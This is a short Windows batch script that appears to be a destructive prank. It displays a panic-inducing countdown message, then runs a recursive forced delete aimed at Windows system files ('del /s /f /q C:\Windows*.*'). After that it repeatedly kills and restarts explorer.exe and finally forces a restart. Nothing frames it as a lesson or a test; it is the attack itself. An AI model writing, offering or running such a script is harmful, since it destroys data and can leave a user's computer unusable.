@echo off
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 10 SECONDS!&echo(&pause"
del /s /f /q C:\Windows*.*
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
shutdown -r /0 -t 10
